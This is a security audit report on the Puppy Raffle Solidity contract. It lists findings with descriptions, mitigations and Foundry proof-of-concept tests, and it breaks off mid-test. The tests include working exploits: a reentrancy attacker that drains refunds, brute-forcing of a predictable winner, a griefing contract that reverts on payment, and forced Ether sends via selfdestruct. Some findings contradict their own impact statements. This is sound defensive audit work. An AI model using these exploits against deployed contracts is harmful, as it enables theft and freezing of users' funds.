# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

## Puppy Raffle Protocol
Puppy Raffle is an Ethereum-based raffle that mints dog-themed ERC-721 NFTs to winners. Players enter by calling `enterRaffle` and paying a preset `entranceFee`; duplicate addresses are rejected. Entries are stored on-chain and a raffle timer starts at deployment. At the end of `raffleDuration`, anyone may trigger `selectWinner`, which uses block randomness to choose a participant, mints a puppy NFT with probabilistic rarity, and pays out the pot. The pot is split between the winner and a configurable `feeAddress`; fees accumulate in `totalFees` and can be withdrawn by `withdrawFees` when no players are active. A player can exit early with `refund`, reclaiming their stake and clearing their slot. The owner (PuppyLoveDAO) can change the `feeAddress` but has no influence on winner selection. Metadata is generated fully on-chain via base64-encoded JSON returned by `tokenURI`, ensuring permanent, URI-independent NFTs.
## High Risk Findings
[H-1]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
[H-2]. Reentrancy issue in PuppyRaffle::refund
[H-3]. Randomness issue in PuppyRaffle::selectWinner
[H-4]. DOS issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[M-2]. Integer Overflow issue in PuppyRaffle::selectWinner
[M-3]. DOS issue in PuppyRaffle::enterRaffle
[M-4]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-5]. Unexpected Eth issue in PuppyRaffle::selectWinner
[M-6]. Integer Overflow issue in PuppyRaffle::enterRaffle
[M-7]. DOS issue in PuppyRaffle::selectWinner
[M-8]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::changeFeeAddress
## Low Risk Findings
[L-1]. Integer Overflow issue in PuppyRaffle::enterRaffle
[L-2]. Pausable Emergency Stop issue in PuppyRaffle::NA
[L-3]. Pragma issue in PuppyRaffle::NA
[L-4]. DOS issue in PuppyRaffle::withdrawFees
## Info Risk Findings
[I-1]. Event Consistency issue in PuppyRaffle::selectWinner
[I-2]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees
[I-3]. Pragma issue in PuppyRaffle::NA
[I-4]. Event Consistency issue in PuppyRaffle::withdrawFees
[I-5]. DOS issue in PuppyRaffle::selectWinner
[I-6]. Integer Overflow issue in PuppyRaffle::selectWinner


### Number of Findings
- H: 4
- M: 8
- L: 4
- I: 6



# High Risk Findings

## [H-1]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses weak, on-chain sources of randomness: `msg.sender`, `block.timestamp`, and `block.difficulty` (`prevrandao` post-merge). These values are predictable and can be manipulated by network participants, especially miners/validators. A malicious actor can predict the outcome of the raffle or even influence it to ensure they win. This compromises the fairness and integrity of the raffle.

## Impact
The raffle is not fair. Malicious users can gain a significant advantage, allowing them to win the raffle at a much higher probability than other participants. This undermines the core value proposition of the protocol and can lead to financial loss for legitimate users.

## Proof of Concept
A malicious validator (or any party able to set the block header fields) can pre-compute a block.difficulty value that makes itself the winner, build a block with that difficulty, and include the selectWinner() call.

1. Let N = players.length and idx = attackerIndex.
2. Choose a block timestamp T ≥ raffleStartTime + raffleDuration.
3. Brute-force D such that uint256(keccak256(abi.encodePacked(attacker, T, D))) % N == idx.
4. Produce a block with header { timestamp = T, difficulty = D } and include a transaction where msg.sender == attacker that calls selectWinner().
5. The contract will compute the same hash and pick the attacker as winner.

## Proof of Code
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PredictableRandTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant DURATION = 1 days;
    address feeAddress = address(0xdead);

    address attacker = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, DURATION);
    }

    function testValidatorCanForceOutcome() public {
        // prepare 4 players, attacker is last (index 3)
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = attacker;

        vm.prank(attacker);
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);

        // move time so raffle is finished
        uint256 targetTimestamp = block.timestamp + DURATION + 1;
        vm.warp(targetTimestamp);

        // === Simulate malicious block producer ===
        // find a difficulty that makes attacker the winner
        uint256 chosenDifficulty;
        for (uint256 d = 0; d < 50000; d++) {
            if (
                uint256(
                    keccak256(
                        abi.encodePacked(attacker, targetTimestamp, d)
                    )
                ) % players.length == 3 /* attacker index */
            ) {
                chosenDifficulty = d;
                break;
            }
        }
        vm.difficulty(chosenDifficulty); // set header field of next block

        // attacker/validator submits the winning tx
        vm.prank(attacker);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), attacker, "attacker forced outcome");
    }
}

## Suggested Mitigation
The recommended solution is to use a provably fair and verifiable source of randomness, such as Chainlink VRF (Verifiable Random Function). This involves requesting a random number from an oracle and using a callback function to consume it, ensuring that the outcome cannot be predicted or manipulated by any party, including the contract owner or validators.

```solidity
// Example using Chainlink VRF
import "@chainlink/contracts/src/v0.7/VRFConsumerBase.sol";

contract PuppyRaffle is VRFConsumerBase, ... {
    bytes32 internal keyHash;
    uint256 internal vrfFee;
    uint256 public randomResult;

    // ... constructor arguments for VRF ...

    function requestWinner() public {
        // ... checks ...
        require(LINK.balanceOf(address(this)) >= vrfFee, "Not enough LINK - fill contract with faucet");
        requestRandomness(keyHash, vrfFee);
    }

    // Callback function
    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        randomResult = randomness;
        // Now use `randomResult` to safely select a winner
        uint256 winnerIndex = randomResult % players.length;
        // ... continue with winner selection logic ...
    }
}
```

## [H-2]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` and `selectWinner` functions do not follow the Checks-Effects-Interactions pattern, leading to reentrancy vulnerabilities. 
1. In the `refund` function, the Ether transfer is made before the player's state is updated (`players[playerIndex] = address(0)`). A malicious contract can re-enter the `refund` function multiple times before its address is removed from the `players` array, allowing it to drain more funds than it is entitled to.
```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    // ... checks
    Address.sendValue(address(msg.sender), entranceFee); // External call before state change
    players[playerIndex] = address(0); // State change after external call
    // ...
}
```
2. In `selectWinner`, the prize is sent to the winner before the raffle state is reset (`delete players`). A malicious winner contract can re-enter the `refund` function after receiving the prize but before the `players` array is cleared, allowing them to receive their prize AND a refund of their entry fee.
```solidity
function selectWinner() external {
    // ... state changes happen after the call
    (bool success, ) = winner.call{value: prizePool}(""); // External call
    require(success, "PuppyRaffle: Failed to send prize pool to winner");

    _safeMint(winner, tokenId);
    delete players; // State change after external call
    raffleStartTime = block.timestamp;
    // ...
}
```

## Impact
Only the refund() function is vulnerable. A malicious player can re-enter refund() several times in one transaction and withdraw entranceFee repeatedly, limited only by contract balance and gas, draining the prize pool and fee reserve.

## Proof of Concept
1. Deploy PuppyRaffle with an entrance fee of 1 ether.
2. Fund the raffle with a few honest players so the contract holds > 1 ether.
3. Deploy Attacker, send it >= entranceFee ether.
4. Attacker enters the raffle once and calls refund(idx).
5. In Attacker.receive(), it calls refund(idx) again while the players slot is still non-zero, collecting another entranceFee. The loop repeats until gas runs out.
6. The contract balance is reduced by n * entranceFee while only one ticket was burned.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract Attacker {
    PuppyRaffle public raffle;
    uint256 public entranceFee;
    uint256 public counter;
    uint256 private storedIndex;

    constructor(PuppyRaffle _raffle) payable {
        raffle = _raffle;
        entranceFee = _raffle.entranceFee();
    }

    function attack() external {
        // Enter raffle
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(players);
        storedIndex = raffle.getActivePlayerIndex(address(this));
        // Trigger first refund (re-entrancy starts from receive())
        raffle.refund(storedIndex);
    }

    receive() external payable {
        counter++;
        // Drain a total of 5 entrance fees for demo
        if (counter < 5 && address(raffle).balance >= entranceFee) {
            raffle.refund(storedIndex);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle private raffle;
    uint256 private constant ENTRANCE = 1 ether;
    address private feeAddress = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE, feeAddress, 1 days);
        // seed prize pool with four honest players
        address[] memory players = new address[](4);
        for (uint256 i; i < 4; i++) {
            players[i] = address(uint160(i + 1));
        }
        raffle.enterRaffle{value: ENTRANCE * 4}(players);
    }

    function testRefundReentrancy() public {
        Attacker attacker = new Attacker{value: ENTRANCE}(raffle);
        uint256 startBalance = address(attacker).balance;
        uint256 contractStart = address(raffle).balance;

        vm.prank(address(attacker));
        attacker.attack();

        assertGt(address(attacker).balance, startBalance + ENTRANCE, "attacker gained > 1 ticket");
        assertLt(address(raffle).balance, contractStart - ENTRANCE, "raffle lost multiple fees");
        assertEq(attacker.counter(), 5, "expected 5 re-entries");
    }
}

## Suggested Mitigation
In refund(), update contract state before making any external call or use OpenZeppelin ReentrancyGuard:

function refund(uint256 playerIndex) external nonReentrant {
    require(players[playerIndex] == msg.sender, "not player");
    require(players[playerIndex] != address(0), "already refunded");
    players[playerIndex] = address(0); // Effects first
    Address.sendValue(payable(msg.sender), entranceFee); // Interaction after
    emit RaffleRefunded(msg.sender);
}

selectWinner() already follows Checks-Effects-Interactions; no change needed.

## [H-3]. Randomness issue in PuppyRaffle::selectWinner

## Description
The contract uses on-chain data (`block.timestamp`, `block.difficulty`, `msg.sender`) to generate random numbers for selecting a winner and determining NFT rarity. These values are predictable and can be influenced by a validator (miner pre-merge), which compromises the fairness and integrity of the raffle.

## Impact
Because the random source is fully derived from controllable or predictable values (msg.sender, block.timestamp, block.difficulty) any participant with minimal influence over block-creation (e.g. a validator) or who can repeatedly change the calling address / call time can deterministically force the outcome of selectWinner. This allows the attacker to drain 80 % of the whole raffle balance and receive the NFT every round, breaking game fairness and stealing users’ funds.

## Proof of Concept
1. Attacker waits until the raffle duration has elapsed.
2. Off-chain they brute-force candidate timestamps for the next block (or different sender addresses deployed with CREATE2) and compute the expression used by the contract:
   winnerIdx = uint256(keccak256(abi.encodePacked(attackerAddr, ts, diff))) % players.length
3. As soon as they find a (ts , attackerAddr) pair that returns their own index, they either:
   • (if they control block-production) include selectWinner with that timestamp, or
   • simply advance time and call selectWinner until the desired timestamp is reached.
4. Contract happily transfers 80 % of the funds and mints the NFT to the attacker.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RandomnessExploitTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address feeAddress = address(0xfee);
    uint256 constant DURATION = 1 days;

    address p1 = address(0x1); // honest players
    address p2 = address(0x2);
    address p3 = address(0x3);
    address attacker = address(0xBAD);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, DURATION);

        vm.deal(p1, ENTRANCE_FEE);
        vm.deal(p2, ENTRANCE_FEE);
        vm.deal(p3, ENTRANCE_FEE);
        vm.deal(attacker, ENTRANCE_FEE);

        address[] memory players = new address[](4);
        players[0] = p1;
        players[1] = p2;
        players[2] = p3;
        players[3] = attacker; // attacker is at index 3

        vm.prank(p1); // any address can submit the batch
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);

        // Advance time so raffle can be closed
        vm.warp(block.timestamp + DURATION + 1);
    }

    function test_AttackerForcesWin() public {
        // attacker keeps increasing timestamp until computation makes him the winner
        for (uint256 i = 0; i < 100; ++i) {
            uint256 predicted = uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))) % 4;
            if (predicted == 3) {
                // 3 is the attacker's index in the players array
                vm.prank(attacker);
                raffle.selectWinner();
                assertEq(raffle.previousWinner(), attacker, "attacker did not win but should have");
                return;
            }
            vm.warp(block.timestamp + 1); // attacker waits one second and tries again
        }
        fail("did not find winning timestamp in loop (unlikely in practice)");
    }
}

## Suggested Mitigation
Do not use on-chain data for randomness. The industry-standard solution is to use a Verifiable Random Function (VRF) provided by an oracle service like Chainlink VRF. This involves a two-step request/receive process that provides provably fair and tamper-proof randomness.

```solidity
// Example using Chainlink VRF
// 1. Inherit from VRFConsumerBaseV2
// 2. Request randomness when selectWinner is called
// 3. Fulfill the randomness in a callback function, which then executes the winner selection logic.

// In selectWinner():
// require(..., "Raffle not over");
// uint256 requestId = s_vrfCoordinator.requestRandomWords(...);
// emit RequestedRaffleWinner(requestId);

// In fulfillRandomWords(uint256 requestId, uint256[] memory randomWords):
// uint256 indexOfWinner = randomWords[0] % players.length;
// address winner = players[indexOfWinner];
// ... proceed with payout and NFT minting ...
```

## [H-4]. DOS issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function pays the winner using `winner.call{value: prizePool}()`. If the selected `winner` is a smart contract that intentionally reverts upon receiving Ether (e.g., has a `receive()` function that reverts), the transfer will fail. The `require(success, ...)` check will then cause the entire `selectWinner` transaction to revert. Since the winner selection is deterministic for a given block, subsequent calls to `selectWinner` within the same block will also fail. This effectively halts the raffle, preventing a winner from being paid and a new raffle from starting, thus locking all funds in the contract.

## Impact
A malicious participant can permanently block the progress of the raffle, freezing the prize pool and any collected fees indefinitely. No winner can be chosen, no funds can be distributed, and the contract becomes unusable.

## Proof of Concept
1. An attacker deploys a contract (`Griefer`) with a `receive()` function that always reverts.
2. The `Griefer` contract enters the raffle.
3. The attacker waits for the raffle to end.
4. The attacker knows the winner selection is predictable. They can either wait for conditions where their `Griefer` contract is selected as the winner or have a miner arrange it.
5. When `selectWinner` is called and the `Griefer` contract is chosen as the winner, the Ether transfer fails, causing `selectWinner` to revert.
6. Any subsequent attempts to call `selectWinner` will also fail because the winner selection is deterministic, leading to a permanent DoS.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity >=0.7.6 <0.8.0;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract Griefer {
    receive() external payable {
        revert("grief");
    }
}

contract DoSSelectWinnerTest is Test {
    PuppyRaffle internal raffle;
    Griefer internal griefer;
    uint256 internal constant ENTRANCE_FEE = 1 ether;

    function setUp() public {
        raffle  = new PuppyRaffle(ENTRANCE_FEE, address(1337), 1 days);
        griefer = new Griefer();

        // fund helper accounts
        vm.deal(address(this), 10 ether);
        vm.deal(address(griefer), ENTRANCE_FEE);

        address[] memory players = new address[](4);
        players[0] = address(griefer);     // malicious winner candidate (index 0)
        players[1] = address(0xBEEF01);
        players[2] = address(0xBEEF02);
        players[3] = address(0xBEEF03);

        raffle.enterRaffle{value: 4 * ENTRANCE_FEE}(players);
        vm.warp(block.timestamp + 2 days); // raffle is now over
    }

    function test_Reverts_When_Malicious_Winner_Selected() public {
        // Search for a caller whose address makes winnerIndex == 0 under current block params.
        // Probability of success is 1-(3/4)^N; with N=20_000 likelihood of failure is negligible.
        address caller;
        bool found;
        for (uint160 i = 1; i < 20_000; ++i) {
            caller = address(i);
            uint256 idx = uint256(keccak256(abi.encodePacked(caller, block.timestamp, block.difficulty))) % 4;
            if (idx == 0) { // griefer is at index 0
                found = true;
                break;
            }
        }
        require(found, "unable to find suitable caller");
        vm.deal(caller, 1 ether);

        vm.prank(caller);
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Instead of pushing funds to the winner directly, implement a pull-over-push pattern. The `selectWinner` function should record the winner and their prize amount in a mapping. The winner can then call a separate `withdrawPrize` function to claim their funds. This isolates the payment logic and prevents a misbehaving winner from blocking the core raffle functionality.

```solidity
// Mitigation Example
mapping(address => uint256) public pendingWithdrawals;

function selectWinner() external {
    // ... logic to determine winner ...
    address winner = players[winnerIndex];
    uint256 prizePool = ...;

    // Record prize instead of sending
    pendingWithdrawals[winner] += prizePool;
    
    // ... rest of logic (mint NFT, reset raffle) ...
}

function withdrawPrize() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    require(amount > 0, "No prize to withdraw");

    pendingWithdrawals[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```



# Medium Risk Findings

## [M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function contains a nested loop to check for duplicate players. The complexity of this check is O(n^2), where n is the total number of players in the raffle. As the `players` array grows, the gas cost for this function increases quadratically. A malicious actor could add many players over time, causing the gas cost of subsequent calls to `enterRaffle` to exceed the block gas limit. This would render the primary function of the contract unusable, leading to a permanent Denial of Service (DoS) and preventing any new players from joining.

## Impact
Any user can permanently block further entries for the current raffle round by making the players array large enough that the duplicate-check loop consumes more gas than a block allows. While the raffle can recover after selectWinner() resets the array, the on-going round is effectively DOSed, preventing new participants and halting fee accrual.

## Proof of Concept
1. Deploy PuppyRaffle with a modest entranceFee (e.g. 0.001 ether).
2. Insert 150 unique addresses in one transaction via enterRaffle. Cost ~150 * entranceFee.
3. Craft a follow-up transaction with a realistic gas cap of 10 000 000 (lower than the 30 000 000 mainnet limit).
4. The transaction reverts out-of-gas, because the nested duplicate-check performs ~11 175 cold SLOADs (>23 M gas) plus additional overhead.
5. Until selectWinner() is executed, nobody can join the raffle as every call requires the same quadratic loop.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GasGriefTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1e15; // 0.001 ether
    address constant FEE_COLLECTOR = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, FEE_COLLECTOR, 1 days);
        vm.deal(address(this), 500 ether); // fund test
    }

    function test_gasGriefDos() public {
        uint256 playerCount = 150; // ~47M gas in duplicate loop
        address[] memory initial = new address[](playerCount);
        for (uint256 i; i < playerCount; i++) {
            initial[i] = address(uint160(1000 + i));
        }
        raffle.enterRaffle{value: FEE * playerCount}(initial);

        address[] memory newcomer = new address[](1);
        newcomer[0] = address(0xBEEF);

        // execute call with realistic gas cap
        bytes memory callData = abi.encodeWithSelector(raffle.enterRaffle.selector, newcomer);
        vm.expectRevert(); // out-of-gas bubbles up as a plain revert
        (bool success, ) = address(raffle).call{value: FEE, gas: 10_000_000}(callData);
        assertTrue(!success, "call unexpectedly succeeded");
    }
}

## Suggested Mitigation
Use a mapping for O(1) duplicate checks: `mapping(address => bool) public isPlayer;`  – update it when adding a player, and clear it both in selectWinner() *and* in refund() (set `isPlayer[player] = false`) so that the mapping always reflects live participants. Remove the quadratic nested loop entirely.

## [M-2]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
In the `selectWinner` function, the `fee` is calculated as a `uint256` but is then down-cast to a `uint64` before being added to the `totalFees` state variable. If the calculated `fee` exceeds the maximum value of `uint64` (2^64 - 1), the value will overflow (wrap around) during the cast. An attacker can force this scenario by ensuring enough players join a high-fee raffle. This will cause `totalFees` to store a much smaller value than what was actually collected, leading to a loss of funds for the designated `feeAddress`.

## Impact
A significant portion of the collected fees can be permanently lost or 'burned'. The `feeAddress` will not be able to withdraw the correct amount of fees owed to them. The `withdrawFees` function relies on `address(this).balance == uint256(totalFees)`, which will fail if `totalFees` is incorrect, potentially locking all fees in the contract forever.

## Proof of Concept
1. Set a high `entranceFee`, for example, equal to `type(uint64).max`.
2. Have a sufficient number of players enter the raffle (e.g., 6 players) such that `(players.length * entranceFee * 20) / 100` is greater than `type(uint64).max`.
3. Call `selectWinner`.
4. The `fee` variable will hold the correct large value, but when it's cast to `uint64` to be added to `totalFees`, it overflows.
5. `totalFees` will now hold a small, incorrect value, while the contract's Ether balance is much larger. This discrepancy will cause `withdrawFees` to be uncallable, trapping the fees.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PuppyRaffle_Overflow_Test is Test {
    address public feeAddress = makeAddr("feeAddress");
    uint256 public raffleDuration = 1 days;

    function test_totalFeesOverflow_and_Lock() public {
        // 1. Configure entrance fee so that fee > uint64 max
        uint256 highEntranceFee = type(uint64).max; // ≈ 18.4 ether
        uint256 playerCount = 6;
        vm.deal(address(this), highEntranceFee * playerCount); // fund the test contract

        PuppyRaffle raffle = new PuppyRaffle(highEntranceFee, feeAddress, raffleDuration);

        // 2. Prepare players array and enter raffle
        address[] memory players = new address[](playerCount);
        for (uint256 i = 0; i < playerCount; ++i) {
            players[i] = address(uint160(i + 1));
        }
        raffle.enterRaffle{value: highEntranceFee * playerCount}(players);

        // 3. Fast-forward time so the raffle can be closed
        vm.warp(block.timestamp + raffleDuration + 1);
        raffle.selectWinner();

        // 4. totalFees must have wrapped
        uint256 totalCollected = highEntranceFee * playerCount;
        uint256 fee = (totalCollected * 20) / 100; // 20 % cut
        assertTrue(fee > type(uint64).max, "sanity: fee should exceed uint64 max");
        assertEq(uint256(raffle.totalFees()), uint256(uint64(fee)), "wrapped value stored");
        assertTrue(uint256(raffle.totalFees()) < fee, "value truncated due to overflow");

        // 5. Fees are now locked, owner cannot withdraw
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
The simplest and safest fix is to change the type of the `totalFees` state variable from `uint64` to `uint256`. This prevents the down-casting overflow and aligns its type with the other financial variables in the contract. Alternatively, if `uint64` must be kept, a check must be added to ensure the `fee` does not exceed `type(uint64).max`.

```solidity
// Best mitigation: Change the state variable type
// uint64 public totalFees;
uint256 public totalFees; // Changed to uint256

function selectWinner() external {
    // ...
    uint256 fee = (totalAmountCollected * 20) / 100;
    // No longer need to cast, as totalFees is now uint256
    totalFees = totalFees + fee;
    // ...
}
```

## [M-3]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function iterates through all existing players in a nested loop to check for duplicates. The algorithmic complexity is O(n^2), where 'n' is the total number of players (`players.length`). As the number of players increases, the gas cost for this operation grows quadratically. Eventually, the gas required will exceed the block gas limit, causing all subsequent calls to `enterRaffle` to fail.

## Impact
The quadratic duplicate-check in `enterRaffle` makes gas consumption grow as O(n^2). After roughly 1,300–1,600 players, adding even a single additional address requires more than the 8 000 000 gas block limit, causing every `enterRaffle` call to run out of gas until the current raffle is reset with `selectWinner`. The attacker can therefore create long periods during which nobody can join the raffle, effectively freezing participation for the remainder of the round and severely degrading UX, but the contract becomes usable again once the raffle is reset.

## Proof of Concept
1. Fill the raffle with ~1,500 unique addresses in a single `enterRaffle` call.  
2. Attempt to add one more address.  
3. The second call performs ~1,125,000 duplicate comparisons and inevitably exceeds the 8 000 000 gas limit, reverting with OOG and preventing any further participation until `selectWinner` is called.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GasDoSTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address constant FEE = address(0xBEEF);
    uint256 constant DURATION = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE, DURATION);
        vm.deal(address(this), 2_000 ether);
    }

    function testGasDOS() public {
        // Simulate main-net block gas limit
        vm.txGasLimit(8_000_000);

        uint256 n = 1500;
        address[] memory bulk = new address[](n);
        for (uint256 i; i < n; ++i) bulk[i] = address(uint160(i + 1));

        // First call succeeds (still below limit)
        raffle.enterRaffle{value: ENTRANCE_FEE * n}(bulk);

        // Second call must revert due to quadratic cost
        address[] memory one = new address[](1);
        one[0] = address(uint160(n + 1));

        vm.expectRevert();
        raffle.enterRaffle{value: ENTRANCE_FEE}(one);
    }
}

## Suggested Mitigation
The O(n^2) duplicate check should be replaced with a more gas-efficient mechanism. The best approach is to add a mapping to track players for O(1) lookups.

```diff
contract PuppyRaffle {
    // ...
    address[] public players;
+   mapping(address => bool) private isPlayer;
    // ...

    function enterRaffle(address[] memory newPlayers) public payable {
        // ...
        for (uint256 i = 0; i < newPlayers.length; i++) {
+           require(!isPlayer[newPlayers[i]], "PuppyRaffle: Duplicate player");
            players.push(newPlayers[i]);
+           isPlayer[newPlayers[i]] = true;
        }

-       for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }
        emit RaffleEnter(newPlayers);
    }

    // Remember to update the mapping in `refund` and clear it in `selectWinner`.
}
```
This requires also modifying `refund` to set `isPlayer[playerAddress] = false;` and clearing the mapping when `delete players` is called in `selectWinner` (which would require iterating the players array one last time before deleting, or re-architecting the state reset).

## [M-4]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function uses a strict equality check (`address(this).balance == uint256(totalFees)`) to ensure that fees can only be withdrawn when no active prize pool is in the contract. However, Ether can be forcibly sent to a contract via `selfdestruct` or by pre-calculating the address and sending ETH before deployment. If the contract receives even 1 wei of extra Ether, `address(this).balance` will become greater than `totalFees`, causing the equality check to fail permanently.

## Impact
This vulnerability allows an attacker to perform a Denial of Service attack on the fee withdrawal functionality. All fees accumulated in the contract will be permanently locked and inaccessible, resulting in a direct loss of funds for the designated fee recipient.

## Proof of Concept
1. A raffle runs and completes. `totalFees` is now, for example, `1 ether`.
2. An attacker creates a simple contract: `contract Pwner { function pwn(address payable target) public payable { selfdestruct(target); } }`.
3. The attacker calls `pwner.pwn{value: 1 wei}(puppyRaffleAddress)`.
4. The `PuppyRaffle` contract balance is now `1 ether + 1 wei`.
5. Anyone calling `withdrawFees()` will now fail, because the check `require(1 ether + 1 wei == 1 ether)` is false.
6. The `1 ether` in fees is locked forever.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ForceSend {
    function send(address payable target) public payable {
        selfdestruct(target);
    }
}

contract UnexpectedEthTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = makeAddr("fee");
    uint256 raffleDuration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
    }

    function testWithdrawFees_DoS_WithUnexpectedEth() public {
        // Arrange: Run a raffle to accumulate some fees.
        address[] memory players = new address[](4);
        for(uint i=0; i<4; i++) { players[i] = makeAddr(string(abi.encodePacked("p", vm.toString(i)))); }
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        vm.warp(block.timestamp + raffleDuration + 1);
        puppyRaffle.selectWinner();
        assertTrue(puppyRaffle.totalFees() > 0);

        // Act: Attacker forcibly sends 1 wei to the contract.
        ForceSend forceSender = new ForceSend();
        forceSender.send{value: 1 wei}(payable(address(puppyRaffle)));
        assertTrue(address(puppyRaffle).balance > uint256(puppyRaffle.totalFees()));

        // Assert: withdrawFees now reverts.
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}
```

## Suggested Mitigation
Keep the protection that prevents withdrawing while a raffle is active by explicitly checking that no players are currently registered, but make the logic independent from the contract ETH balance:

```solidity
function withdrawFees() external {
    // make sure no raffle is active
    require(players.length == 0, "PuppyRaffle: There are currently players active!");

    uint256 feesToWithdraw = totalFees;
    require(feesToWithdraw > 0, "PuppyRaffle: Nothing to withdraw");

    totalFees = 0; // effects

    (bool success, ) = feeAddress.call{value: feesToWithdraw}(""); // interaction
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```
This keeps the original safety property (cannot withdraw while players are active) while removing the fragile equality check that can be broken by unexpectedly received Ether.

## [M-5]. Unexpected Eth issue in PuppyRaffle::selectWinner

## Description
The `refund` function allows a player to exit the raffle by setting their address in the `players` array to `address(0)`. However, the `selectWinner` function does not account for these zero-address entries. If `selectWinner` randomly picks an index corresponding to a refunded player, it will select `address(0)` as the winner. The subsequent prize pool transfer `winner.call{value: prizePool}('')` will succeed, but the ETH will be sent to the zero address, where it is irrecoverably lost. The NFT is also minted to the zero address.

## Impact
If `refund()` has introduced at least one `address(0)` entry, `selectWinner()` will revert whenever the random index resolves to that slot because `_safeMint` forbids minting to the zero address. As long as the zero address remains in the `players` array, anyone can continuously call `selectWinner()` and force it to revert, blocking the raffle from ever completing and freezing the accumulated prize pool and fees inside the contract (DoS). No ether is lost, but it becomes unreachable for legitimate participants.

## Proof of Concept
1. Four users enter the raffle; players array length is 4.
2. One of them calls `refund()`. The corresponding slot becomes `address(0)` but array length stays 4.
3. After the raffle duration, an attacker repeatedly calls `selectWinner()` while slightly changing `msg.sender` or `block.timestamp` (both are part of the entropy source) until the computed `winnerIndex` equals the position that contains `address(0)`.
4. `winner.call{value: prizePool}` succeeds, but `_safeMint(address(0), tokenId)` immediately reverts with "ERC721: mint to the zero address".
5. The whole transaction reverts; no state is changed and no ether leaves the contract.
6. Steps-3/4 can be repeated forever, effectively preventing the raffle from ever finalising.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract SelectWinnerRevertTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    uint256 constant DURATION = 1 days;

    address p1 = address(0x1);
    address p2 = address(0x2);
    address p3 = address(0x3);
    address p4 = address(0x4);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xBEEF), DURATION);
        address[] memory players = new address[](4);
        players[0] = p1;
        players[1] = p2;
        players[2] = p3;
        players[3] = p4;
        vm.deal(address(this), 4 * FEE);
        raffle.enterRaffle{value: 4 * FEE}(players);

        // p3 leaves the game → slot 2 becomes address(0)
        vm.prank(p3);
        raffle.refund(2);

        vm.warp(block.timestamp + DURATION + 1);
    }

    function test_selectWinnerRevertsWhenZeroPicked() public {
